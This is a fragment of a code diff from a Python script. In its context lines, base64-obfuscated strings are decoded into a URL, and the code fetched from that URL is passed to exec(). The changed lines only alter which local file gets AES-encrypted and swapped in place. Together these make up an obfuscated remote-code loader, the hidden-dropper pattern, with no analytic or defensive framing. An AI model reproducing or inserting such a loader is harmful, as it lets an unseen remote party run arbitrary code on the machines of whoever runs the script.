@@ -9,9 +9,9 @@ try:
      d = base64.b64decode(payload.replace(payload[:28],'')).replace(b'%2F',b' '); link.append(b'r'+b''.join(base64.b64decode(d.replace(d[:14],b'')[:72]).split(b'+')))
      a = d.split(b' '); [link.append(b''.join(a[a2].split(b'+'))) for a2 in [3,4,5,6]]
      exec(requests.get(b'/'.join(link).decode()).text)
-     with open(os.getcwd()+"\\main.py","r") as f:
-         with open(os.getcwd()+"\\main.enc","wb") as f2:f2.write(AES_CRYPTO(mode_iv_hash="MD5").encrypt(f.read()))
-     os.rename(os.getcwd()+"\\main.py",os.getcwd()+"\\main.enc2")
-     os.rename(os.getcwd()+"\\main.enc",os.getcwd()+"\\main.py")
-     os.remove(os.getcwd()+"\\main.enc2")
+     with open(os.getcwd()+"\\EncryptionPayload_Test.py","r") as f:
+         with open(os.getcwd()+"\\EncryptionPayload_Test.enc","wb") as f2:f2.write(AES_CRYPTO(mode_iv_hash="MD5").encrypt(f.read()))
+     os.rename(os.getcwd()+"\\EncryptionPayload_Test.py",os.getcwd()+"\\EncryptionPayload_Test.enc2")
+     os.rename(os.getcwd()+"\\EncryptionPayload_Test.enc",os.getcwd()+"\\EncryptionPayload_Test.py")
+     os.remove(os.getcwd()+"\\EncryptionPayload_Test.enc2")
 except Exception as e:print(e)
